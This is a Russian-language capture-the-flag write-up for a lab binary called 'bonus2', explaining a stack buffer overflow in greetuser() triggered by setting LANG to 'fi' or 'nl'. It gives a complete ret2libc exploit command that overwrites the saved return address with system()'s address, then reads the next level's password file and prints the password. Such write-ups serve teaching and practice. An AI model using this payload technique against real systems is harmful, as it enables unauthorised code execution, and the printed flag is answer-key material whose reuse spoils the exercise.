Программа здесь довольно длинная, потому что в первой части основной функции она просто копирует наши параметры (с защищенным вызовом strncpy ()) в буферы и получает "LANG"
переменная окружения и вызывает для нее функцию memcmp (), чтобы проверить, равно ли она «fi» или «nl» (эта информация затем передается в функцию greetuser () в виде целочисленного флага, но косвенно, потому что она хранится в статическом адрес).
Функция greetuser () проверяет, равен ли флаг 1 или 2, и адаптирует следующее поведение в зависимости от этого. Если флаг установлен в 0, это означает, что переменная среды «LANG» не равна ни «fi», ни «nl».
Поведение по умолчанию следующее:
Программа копирует статическую строку «Hello» в буфер стека и объединяет в ней нашу заданную переменную как argv [1] (посредством вызова функции strcat()), затем
указатель назначения передается в функцию Put (), и отображается строка «Hello` argv [1] `».
Если LANG равен «fi» или «nl», отображаемое сообщение будет изменено с «Hello» на соответствующий другой язык (Финляндия или Нидерланды).
Уязвимость здесь связана с вызовом функции strcat (программа перейдет к следующему заданному параметру) благодаря переменной среды LANG.
Для поведения по умолчанию функции защищены, и буфер может обрабатывать точно нужное количество необходимых байтов, но когда мы меняем язык с помощью переменной среды LANG, отображаемое сообщение длиннее, это приводит к переполнению буфера, которое можно использовать.

Установим для переменной среды LANG значение «fi» или «nl», чтобы строка приветствия была длиннее.
Переполним 4 байта после 23-го смещения второго параметра и помещаем туда адрес функции system () (которая перезапишет сохраненный EIP функции greetuser ()).
Прямо при вызове инструкции `ret` начало нашего буфера (1-й параметр argv [1]) находится в стеке, мы можем использовать его для передачи параметров в system ().

Введем export LANG="fi"
./bonus2 $(python -c "print 'AAAA' + '\x58\xcc\xf8\xb7' + 'A'*42") $(python -c "print 'A'*23 + '\x60\xb0\xe6\xb7'")
Введем cat /home/user/bonus3/.pass
Пароль: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587